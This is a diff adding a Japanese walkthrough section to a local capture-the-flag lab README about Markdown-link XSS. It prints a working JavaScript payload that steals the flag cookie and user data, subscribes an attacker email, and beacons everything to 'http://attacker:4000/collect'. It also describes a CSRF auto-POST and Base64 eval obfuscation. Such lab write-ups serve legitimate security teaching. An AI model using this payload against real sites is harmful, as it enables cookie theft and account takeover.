@@ -38,6 +38,50 @@ http://localhost:4000/lab?webhook=<URLエンコードしたWebhook URL>
 flag=FLAG{local_markdown_xss_cookie_lab}
 ```
 
+## 手動解法
+
+ブラウザだけで解く場合は、次の手順で攻撃チェーンを手で追えます。
+
+1. `docker compose up --build` で起動する
+2. `http://localhost:3000/report` を開く
+3. `url` に `http://localhost:4000/lab` を入力して送信する
+4. bot のレスポンスに `"foundLink":true` と `"clicked":true` が出るまで待つ
+5. `http://localhost:4000/loot` を開く
+6. `flag=FLAG{local_markdown_xss_cookie_lab}` が表示されれば成功
+
+`/lab` は、admin bot のブラウザで読み込まれる CSRF ページです。ページロード時に次の内容を `app` へ自動 POST します。
+
+```text
+POST http://app:3000/help/search
+query=test
+greeting=[open details](javascript:<payload>)
+```
+
+`greeting` は `/help/search` で Markdown として表示されます。脆弱版では Markdown リンク URL のスキーム検証が不足しているため、`javascript:` がそのままリンクになります。admin bot は `.assistant-message a` の最初のリンクを通常クリックするので、リンク内の JavaScript が admin セッションの `app` オリジンで実行されます。
+
+payload が行うことは次の 4 つだけです。
+
+```js
+const flagCookie = document.cookie
+  .split("; ")
+  .find((part) => part.startsWith("flag=")) || "";
+const flag = flagCookie.startsWith("flag=") ? flagCookie.slice("flag=".length) : "";
+const me = await fetch("/api/me", { credentials: "same-origin" }).then((r) => r.json());
+await fetch("/api/conversations/latest/subscribers", {
+  method: "POST",
+  credentials: "same-origin",
+  headers: { "content-type": "application/json" },
+  body: JSON.stringify({ email: "attacker@example.test" })
+});
+navigator.sendBeacon("http://attacker:4000/collect", JSON.stringify({ cookie: flagCookie, flag, me }));
+```
+
+実際の `/lab` では、Markdown の括弧や引用符で壊れにくくするため、この JavaScript を Base64 にして `javascript:eval(atob("..."))` 形式で埋め込んでいます。送信先を外部 Webhook にしたい場合は、報告 URL を次の形にします。
+
+```text
+http://localhost:4000/lab?webhook=<URLエンコードしたWebhook URL>
+```
+
 ## 脆弱性の要点
 
 - `/report` は allowlist 済み URL だけを admin bot に渡します。
